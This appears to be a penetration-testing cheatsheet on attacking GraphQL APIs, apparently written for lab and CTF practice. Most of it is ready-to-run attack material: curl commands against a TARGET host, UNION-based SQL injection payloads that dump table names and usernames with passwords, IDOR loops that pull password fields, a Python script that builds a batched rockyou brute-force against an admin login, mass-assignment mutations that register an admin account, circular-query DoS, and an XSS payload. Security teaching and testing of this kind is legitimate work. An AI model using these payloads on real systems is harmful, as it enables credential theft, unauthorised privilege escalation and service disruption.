---
title: "Attacking GraphQL"
description: "Introspection, malicious queries, injection, and auth bypass in GraphQL."
sidebar:
  order: 14
  label: "Attacking GraphQL"
---
> GraphQL API penetration testing: fingerprinting, introspection, IDOR, SQLi, circular query DoS, batching brute-force, and privilege escalation via mutations.

---


## Fingerprinting and Localization

```bash
# Common GraphQL endpoints
/graphql
/api/graphql
/graphql/v1
/api/v1/graphql
/graph

# Verify if GraphiQL is present (interactive web interface)
curl -s http://TARGET/graphql | grep -i "graphiql\|graphql"

# graphw00f — engine fingerprint
git clone https://github.com/dolevf/graphw00f
cd graphw00f
pip3 install -r requirements.txt

python3 main.py -d -f -t http://TARGET
# Detected engines: Graphene, Apollo, Hasura, GraphQL-Go, Sangria, etc.
# -d: detect endpoint automatically
# -f: engine fingerprint
# Also returns link to the GraphQL-Threat-Matrix with default configurations
```

---

## Introspection — Enumerating the Schema

### Basic Introspection Queries

```graphql
# List all types
{
  __schema {
    types {
      name
    }
  }
}

# Fields of a specific type
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

# Available queries
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}

# Available mutations + arguments
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type { kind name ofType { kind name } }
        }
      }
    }
  }
}

# Fields of an input type (for mutations)
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

### Complete Introspection (Total Schema Dump)

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives {
      name description locations
      args { ...InputValue }
    }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputInput {
  name description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }
}
```

### Visualizing the Schema with GraphQL-Voyager

```
1. Run the complete IntrospectionQuery → copy the JSON result
2. Go to: https://graphql-kit.com/graphql-voyager/
   (In a real engagement: clone the repository and host it locally)
3. Click "CHANGE SCHEMA" → "INTROSPECTION" → paste the result → "DISPLAY"
4. Result: visual diagram of all entities and relationships
   → Look for loops (e.g., User ↔ Post) for DoS attacks
   → Identify sensitive fields (password, role, admin)
```

### cURL with Introspection

```bash
# Query via cURL (escape quotes within JSON)
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name } } }"}' | jq

# List queries
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { queryType { fields { name description } } } }"}' | jq

# Types of an object
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __type(name: \"UserObject\") { name fields { name type { name kind } } } }"}' | jq
```

---

## IDOR in GraphQL

```bash
# 1. Identify query that uses user argument
# E.g.: user(username: "htb-stdnt") { id username role }

# 2. Change the argument to the target user
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(username: \"admin\") { id username role } }"}' | jq

# 3. Add password field (identified via introspection)
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(username: \"admin\") { username password } }"}' | jq

# Enumerate all users with their password
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ users { id username password role } }"}' | jq

# IDOR by numerical ID
for i in $(seq 1 50); do
    curl -s -X POST http://TARGET/graphql \
         -H "Content-Type: application/json" \
         -d "{\"query\":\"{ user(id: $i) { id username password role } }\"}" | jq -c '.'
done
```

---

## SQL Injection in GraphQL

```graphql
# 1. Confirm SQLi — inject single quote
{
  user(username: "htb-stdnt'") {
    username
  }
}
# If it responds with SQL error -> vulnerable

# 2. Boolean blind — comment out the rest of the WHERE
{
  user(username: "htb-stdnt' --") {
    username
  }
}
# If it returns the same result as without payload -> comment works -> SQLi confirmed

# 3. UNION-based — enumerate tables
# (adapt the number of columns to the introspection result)
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}

# 4. UNION — dump of columns of a table
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='users'-- -") {
    username
  }
}

# 5. UNION — extract data
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6 FROM users-- -") {
    username
  }
}
```

```bash
# Via cURL (escape double quotes with \")
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(username: \"x'"'"' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") { username } }"}' | jq

# SQLMap against GraphQL (experiment with --data and --level)
sqlmap -u "http://TARGET/graphql" \
       --data='{"query":"{ user(username: \"*\") { username } }"}' \
       --headers="Content-Type: application/json" \
       --level=3 --risk=2 --batch --dbms=mysql
```

---

## DoS — Circular Query

```graphql
# Identify loop in Voyager: e.g. UserObject.posts -> PostObject.author -> UserObject
# Exploit the loop nesting levels (response grows exponentially)

# Level 3 — baseline (large response)
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}

# High level — can crash the server/GraphiQL
# (repeat the pattern posts -> author -> posts -> edges -> node -> author... N times)
```

> **Note:** In CTFs/exams, demonstrating the vulnerability with 3-4 levels is sufficient for the report. It is not necessary to crash the actual server.

---

## Batching — Brute-Force Rate Limit Bypass

```bash
# Batching = multiple queries in a single HTTP request (JSON array)

# Example: 2 normal queries in 1 request
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '[
       {"query":"{ user(username: \"admin\") { uuid } }"},
       {"query":"{ post(id: 1) { title } }"}
     ]' | jq

# Login brute-force via batching (bypass rate limit per request)
# Generate JSON array with N different login queries:
python3 -c "
import json

passwords = open('/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt').read().splitlines()
batch = []
for pwd in passwords[:500]:  # 500 attempts in a request
    batch.append({'query': f'mutation {{ login(username: \"admin\", password: \"{pwd}\") {{ token }} }}'})
print(json.dumps(batch))
" > batch_payload.json

curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d @batch_payload.json | jq '.[].data.login | select(. != null)'
```

---

## Mutations — Privilege Escalation

```graphql
# 1. Discover available mutations (see introspection section)
# 2. Identify privileged fields in the input (e.g. "role")

# Register normal user
mutation {
  registerUser(input: {
    username: "attacker"
    password: "5f4dcc3b5aa765d61d8327deb882cf99"
    role: "user"
    msg: "test"
  }) {
    user { username role }
  }
}

# Mass Assignment in mutation: inject role:"admin"
mutation {
  registerUser(input: {
    username: "attacker_admin"
    password: "5f4dcc3b5aa765d61d8327deb882cf99"
    role: "admin"
    msg: "Hacked!"
  }) {
    user { username role }
  }
}
# If response reflects role:"admin" -> successful escalation

# Other privileged fields to test in mutations:
# isAdmin: true
# verified: true
# approved: true
# accountType: "premium"
```

```bash
# MD5 of password for mutations that require it
echo -n 'password' | md5sum
# -> 5f4dcc3b5aa765d61d8327deb882cf99

# Execute mutation via cURL
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation { registerUser(input: {username: \"attacker\", password: \"5f4dcc3b5aa765d61d8327deb882cf99\", role: \"admin\", msg: \"test\"}) { user { username role } } }"}' | jq
```

---

## GraphQL-Cop — Automated Audit

```bash
# Installation
git clone https://github.com/dolevf/graphql-cop
cd graphql-cop
pip3 install -r requirements.txt

# Basic audit (without auth)
python3 graphql-cop.py -t http://TARGET/graphql

# With auth (bearer token)
python3 graphql-cop.py -t http://TARGET/graphql \
     -H "Authorization: Bearer TOKEN"

# Typical output:
# [HIGH] Alias Overloading - DoS via 100+ aliases
# [HIGH] Array-based Query Batching - Batching enabled -> brute-force amplification
# [HIGH] Directive Overloading - DoS via duplicate directives
# [HIGH] Field Duplication - DoS via 500 repeated fields
# [HIGH] Introspection - Schema information exposed
# [MEDIUM] GET Method Query Support - CSRF possible
# [LOW] Field Suggestions - Leakage of field names
# [LOW] GraphiQL IDE - Debug interface exposed
```

---

## InQL (Burp Extension)

```
Installation:
  Burp → Extensions → BApp Store → search for "InQL" → Install

Key features:
  1. "InQL" tab → enter the GraphQL URL → "Analyze" → lists all queries/mutations
  2. In Proxy History / Repeater: "GraphQL" tab → edit the query without dealing with JSON
  3. Right-click on GraphQL request → Extensions → InQL → "Generate queries with InQL Scanner"
  4. Batch attack from InQL → right-click → "InQL - Batch Attack"

Useful for:
  - Automatically generating queries for all types
  - Modifying queries legibly (without escaping quotes)
  - Identifying available fields without manual introspection
```

---

## Quick Reference — GraphQL Vulnerabilities

| Vulnerability | Sign / Indicator | Attack |
|----------------|-------|--------|
| IDOR | Query accepts username/id → returns other users' data | Change argument to another user |
| SQLi | `'` in argument → SQL error in response | `' UNION SELECT ... -- -` |
| XSS | Argument reflected in HTML error without encoding | `<script>alert(1)</script>` in integer argument |
| DoS | Loop between types (User↔Post) | Nest loop 10+ levels |
| Batching abuse | Batching enabled + login in mutation | JSON array with 1000 queries |
| Privilege escalation | Mutation with `role` field in input | `role: "admin"` in registerUser |
| Info Disclosure | Introspection enabled | `__schema { types { name } }` |
| Info Disclosure | Active field suggestions | Errors with "Did you mean..." |

---

## Pitfalls / Gotchas

- **Introspection disabled:** if `__schema` returns an error, try field suggestions: write an incorrect field name and see if the error says "Did you mean X?" — the engine suggests real names.
- **Connections (edges/node) in queries:** some types are `connections` (Relay pagination). To access the objects: `{ posts { edges { node { title } } } }` — forgetting `edges`/`node` returns an error.
- **SQLi: number of columns in UNION:** use introspection to count the fields of the returned type. A `UserObject` with 6 fields requires `UNION SELECT 1,2,3,4,5,6`.
- **GraphQL via GET also works:** `GET /graphql?query={users{username}}` — if enabled, it can be a CSRF vector.
- **DoS: do not crash the real target:** demonstrate with 3-4 levels. HTB labs can be crashed; in a real pentest, stop before crashing.
- **Mutations with MD5 password:** some backends expect the password to be already hashed in the mutation — check in the schema or by intercepting normal registration.
- **Batching might be disabled:** if the JSON array returns an error, verify if graphql-cop reports it as enabled first.
- **GraphiQL in production = finding in itself:** the exposed debug interface is a Medium/High finding — it allows executing queries directly from the browser without additional auth.

---

## Related Cheatsheets

- [API Attacks](/en/metodologias/web/api-attacks/) — OWASP API Top 10, BOLA/IDOR in REST
- [Web Requests](/en/metodologias/fundamentos/web-requests/) — cURL for manual GraphQL queries
- [Web Fuzzing](/en/metodologias/recon/web-fuzzing/) — discovering the /graphql endpoint with ffuf
- [Broken Authentication](/en/metodologias/web/broken-authentication/) — credentials brute-force
- [Server-side Attacks](/en/metodologias/web/server-side-attacks/) — SSRF possible via URI fields in mutations
